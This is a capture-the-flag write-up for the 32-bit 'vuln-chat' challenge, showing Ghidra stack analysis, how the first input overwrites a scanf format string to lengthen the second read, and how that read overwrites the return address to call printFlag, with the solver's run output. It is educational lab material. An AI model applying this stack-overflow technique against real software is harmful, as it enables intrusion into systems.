# Vuln_chat Writeup

## Steps
1. Important first step is checking what type of file `vuln-chat` is --- This is something we should always check first
```
$ file vuln-chat 
vuln-chat: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a3caa1805eeeee1454ee76287be398b12b5fa2b7, not stripped
```
`vuln-chat` is a 32-bit executable, rather than 64-bit like we have been looking at so far.

2. When we run vuln-chat we see there are 2 inputs, the first of which gets repeated back to us --- analyze this more in ghidra
```
$ ./vuln-chat
----------- Welcome to vuln-chat -------------
Enter your username: user
Welcome user!
Connecting to 'djinn'
--- 'djinn' has joined your chat ---
djinn: I have the information. But how do I know I can trust you?
user: test
djinn: Sorry. That's not good enough
```
3. Look at the stack variable layout

```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined main()
             undefined         <UNASSIGNED>   <RETURN>
             undefined1        Stack[-0x5]:1  local_5                                 XREF[1]:     080485c5(W)  
             undefined4        Stack[-0x9]:4  fmt                                     XREF[3]:     080485be(W), 
                                                                                                   080485cd(*), 
                                                                                                   08048630(*)  
             undefined1[20]    Stack[-0x1d]   user                                    XREF[3]:     080485c9(*), 
                                                                                                   080485d9(*), 
                                                                                                   0804861b(*)  
             undefined1[20]    Stack[-0x31]   pwd                                     XREF[1]:     0804862c(*)  
                             main                                            XREF[4]:     Entry Point(*), 
                                                                                          _start:08048487(*), 08048830, 
                                                                                          080488ac(*)  
```
The first input (renamed to 'user') is at `Stack[-0x1d]` and the second input is at `Stack[-0x31]`. There is also fmt which is at `Stack[-0x9]`and has a value of %30s, which limits input to 30 characters.

Since `0x1d - 0x9 = 0x14`, which is 20 in decimal, we can overwrite fmt with input to change the input limit.

4. With the increased character limit, pwd can now be used to overwrite the return address to the address of `printFlag` which is `0x804856b`

5. Create 2 payloads. The first overwrites 20 bytes and changes fmt to "%99s", the greatest string length that can be fit in 4 bytes. The second overwrites `0x31` bytes and changes the return address to the address of `printFlag`

6. Send payloads to process


## Solution
```
$ python3 ex_vulnchat.py
[+] Starting local process './vuln-chat': pid 102471
/home/kali/Binex-Writeups/Nightmare/05-bof_callfunction/03-vuln_chat/ex_vulnchat.py:10: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline(payload1)
[*] Switching to interactive mode
----------- Welcome to vuln-chat -------------
Enter your username: Welcome AAAAAAAAAAAAAAAAAAAA%99s!
Connecting to 'djinn'
--- 'djinn' has joined your chat ---
djinn: I have the information. But how do I know I can trust you?
AAAAAAAAAAAAAAAAAAAA%99s: djinn: Sorry. That's not good enough
flag{g0ttem_b0yz}
Use it wisely
[*] Got EOF while reading in interactive
$ 
[*] Process './vuln-chat' stopped with exit code -11 (SIGSEGV) (pid 102471)
[*] Got EOF while sending in interactive

```
